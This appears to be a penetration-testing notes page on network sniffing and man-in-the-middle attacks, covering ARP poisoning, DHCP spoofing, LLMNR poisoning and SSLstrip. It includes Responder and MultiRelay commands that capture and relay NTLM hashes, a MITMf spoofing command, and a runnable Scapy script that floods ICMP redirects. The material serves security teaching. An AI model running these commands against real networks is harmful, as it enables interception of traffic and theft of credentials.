## Sniffing

Sniffing is the action to intercept network traffic generated from or directed to a victim. 

### Passive Sniffing

Passive sniffing activities are conducted by just listening to the network without performing any
action.

```bash
# Listen on eth0 interface for everything
tcpdump -i eth0

# Listen for each packet to 10.10.100.1, print the data, the header and each content in ASCII
# with a MTU of 0
tcpdump -xxAXXSs 0 dst 10.10.100.1

# Print verbose output
tcpdump -i eth0 -vvvASs 0 dst 10.10.100.1

# Launch tcpdump loading filters from file
tcpdump -F filters.txt
```

## Man-in-the-Middle

### MAC Flooding

This is an active technique which has the call of filling up the switch's CAM table. This table
keeps the information about which MAC address resides on which port. If the table is full and a new
packet to a MAC address which is not in the table is received, the switch is forced to behave as a
hub and forward the traffic on all the ports. By sending many frames with random MAC addresses
through the switch, the switch will 'learn' these MAC and write them in the table. If the number of
frames is sufficiently high, the CAM table will fill up and the traffic directed toward legitimate
devices will be send in broadcast.

### ARP Poisoning

This is an active technique which abuses the ARP protocol to either mount a MitM attack or to cause
a Denial of Service. In this attack the attacker responds to every ARP request received, therefore
trying to impersonate every device in the network. If the attack is successful, every packet
directed toward any device will be sent first to the attacker device, which can then forward it
to the destination (MitM) or drop it (DoS).

It is possible to also generate gratuitous ARP responses (or requests), in which unsolicited ARP
replies are sent to a destination.

#### Host Poisoning

In this version of the attack, the attacker will try to create a MitM between two hosts. This can be
accomplished for example by sending gratuitous ARP replies to both the hosts.

#### Gateway Poisoning

In this version of ARP poisoning, the attacker will send gratuitous ARP replies to all the hosts (or
some) in the network, announcing his MAC address as the MAC corresponding to the IP of default
gateway.

!!! warning
    In this scenario all the traffic meant for the default gateway will be send first to the
    attacker machine (which then needs to forward it to the gateway unless a DoS is the objective).
    If the attacker device doesn't have sufficient resources, this could cause an inadvertent Denial
    of Service.

### DHCP Spoofing

DHCP Spoofing is an active technique used to mount MitM attack. DHCP communication happens mostly
using broadcast packets, so it is possible to exploit this functionality by responding to any DHCP
discovery packets. Since the criteria used by the client to determine which DHCP offer to choose
(there can be multiple DHCP servers) is the lease time amount (the longer the better), an attacker
can set this lease time very high to make sure that clients will select them. Moreover, DHCP usually
sets also default gateway and DNS servers to use. If the attacker is able to respond to DHCP
discovery packets, then it can also set himself as the default gateway and mount successfully a MitM
attack.

### LLMNR and NBT-NS Spoofing/Poisoning

LLMNR (Link-Local Multicast Name Resolution) is the successor of NBT-NS in aiding with name
discovery in Windows Networks. This attack is usefull to capture NTLMv1, NTLMv2 or LM hashes with a
MitM attack.

Both the mentioned protocols allow for a machine in a Windows network to find another device in case
a DNS request should fail. A usual scenario is a user accessing a non-existing DNS name, for example
with a typo, let's say `//netowrk-share//secret`. The DNS query for `netowrk-share` will fail, as
this host doesn't exist. The machine will fallback into LLMNR to discover the host.
Using tools like [Responder](https://github.com/lgandx/Responder), an attacker can respond to such
message claiming to be `netowrk-share`, so the user will actually contact attacker machine, sending
to it its user and NTLMv1 or NTLMv2 hash.

```bash
# Responder.conf
# SMB = Off
# HTTP = Off
# Start responding to LLMNR 
Responder.py -i eth0 --lm &
# Try to use the hashes collected to login into 10.10.100.1
MultiRelay.py -t 10.10.100.1 -u ALL
```

### SSLstrip and SSLstrip+

SSLstrip is a technique used to intercept and sniff on TLS connections. Assuming that the attacker
successfully mounted a MitM attack, the attack consists of replacing any link that the victim is
trying to acces over HTTPs with HTTP. `sslstrip` can do the work for us, also including a favicon
containing the 'trusted' lock. However, strict transport security header
and in particular the preload list that browsers implement can defeat this attack (HSTS preload
list).
For this reason SSltrip+ technique got introduced. The way this technique works is by adding a
malicious DNS to the ssltrip attack, and redirecting the user to a domain similar to the one that
accessed (e.g., www.faceboook.com rather than www.facebook.com), so that the site in question
won't be on HSTS preload list. In this case the user will establish the connection to the target
over HTTP and with a domain very similar to the one requested, the browser won't force HTTPs and
the traffic can be intercepted.

Tools that implement this technique include `MiTMf`.

```bash
python mitmf.py -i eth0 --spoof --arp --dns --hsts --gateway IP --targets IPs
```

### ICMP Redirect

This technique works between a local and a remote target (e.g., a client in the same subnet and a
webserver elsewhere). The idea is to use a ICMP type 5 code 1 packet to signal to a victim's machine
that there is a better gateway to reach the destination. Once received, the victim will start sending traffic through 
the specified gateway.

To mount this attack it might be necessary to also use iptables to perform masquerading, to NAT the
packets coming from the victim with the attacker IP, so that the target will send the answer back to
us and not to the victim (breaking the MiTM).

```
# Here 10.100.13.0 is the network of the victim
# tap0 is the outgoing interface for the traffic
iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o tap0 -j MASQUERADE
```

Then we can use Scapy to perform the attack, as this allows to conveniently forge packets as needed.

```
from scapy.all import *
# Creating and sending ICMP redirect packets between these entities:
# Gateway for our network
originalRouterIP='10.100.13.1'
# Our own IP
attackerIP='10.100.13.20'
# Target for the MiTM (i.e., client)
victimIP='10.100.13.126'
# Other target for the MiTM (i.e., server)
serverIP='10.23.56.100'
# Here we create an ICMP Redirect packet
# This has type 5 code 1, which is a redirect with a payload which means
#   Gateway Internet Address
#      Address of the gateway to which traffic for the network specified
#      in the internet destination network field of the original
#      datagram's data should be sent.
ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP
# This is a TCP packet that fakes the continuation of the communication that
# will be hijacked by the previous packet
redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555
# Launch the attack
while True:
    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
```

